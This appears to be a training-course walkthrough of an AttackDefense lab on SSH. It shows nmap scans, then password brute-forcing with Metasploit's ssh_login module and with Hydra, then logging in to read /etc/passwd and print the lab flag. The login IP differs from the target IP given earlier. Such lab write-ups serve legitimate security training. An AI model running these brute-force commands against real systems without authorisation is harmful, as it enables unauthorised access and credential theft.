# 🔬SSH

## Lab 1 <a href="#lab-1" id="lab-1"></a>

> 🔬 [SSH Login](https://attackdefense.com/challengedetails?cid=1526)
>
> * Target IP: `192.142.193.3`
> * **Brute-force** of [OpenSSH](https://www.openssh.com/) server
> * **Enumeration and nmap scripts** have been already covered in this [SSH Enum lab](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/3-enumeration/ssh-enum)

### Enumeration <a href="#enumeration" id="enumeration"></a>

```bash
ip -br a
nmap -sn 192.142.193.0/24
```

<figure><img src="../../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```bash
nmap -sV 192.142.193.3
```

```bash
Starting Nmap 7.70 ( https://nmap.org ) at 2024-07-19 08:32 UTC
Nmap scan report for target-1 (192.142.193.3)
Host is up (0.0000090s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:8E:C1:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> OpenSSH 7.9p1 cannot be exploited directly

```bash
msfconsole -q

msf5 > use auxiliary/scanner/ssh/ssh_version 
msf5 auxiliary(scanner/ssh/ssh_version) > show options
msf5 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 192.142.193.3
msf5 auxiliary(scanner/ssh/ssh_version) > run

[+] 192.142.193.3:22      - SSH server version: SSH-2.0-OpenSSH_7.9p1 Ubuntu-10 ( service.version=7.9p1 openssh.comment=Ubuntu-10 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH service.cpe23=cpe:/a:openbsd:openssh:7.9p1 os.vendor=Ubuntu os.family=Linux os.product=Linux os.version=19.04 os.cpe23=cpe:/o:canonical:ubuntu_linux:19.04 service.protocol=ssh fingerprint_db=ssh.banner )
[*] 192.142.193.3:22      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Brute-Force - Metasploit <a href="#brute-force" id="brute-force"></a>

* Metasploit `ssh_login` module or `Hydra` tool can be utilized for brute forcing the SSH password

```bash
msf5 auxiliary(scanner/ssh/ssh_version) > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > show options
msf5 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.142.193.3
msf5 auxiliary(scanner/ssh/ssh_login) > set STOP_ON_SUCCESS true
msf5 auxiliary(scanner/ssh/ssh_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ssh/ssh_login) > set VERBOSE true
msf5 auxiliary(scanner/ssh/ssh_login) > exploit 
```

<figure><img src="../../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Brute-Froce - Hydra

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt -t4 192.142.193.3 ssh
```

<figure><img src="../../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Login to the target via SSH

```bash
ssh sysadmin@192.63.218.3
```

```bash
groups sysadmin
cat /etc/*release
uname -r
cat /etc/passwd
find / -name "flag"
cat /flag
```

<figure><img src="../../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Flag: `eb09cc6f1cd72756da145892892fbf5a`
{% endhint %}

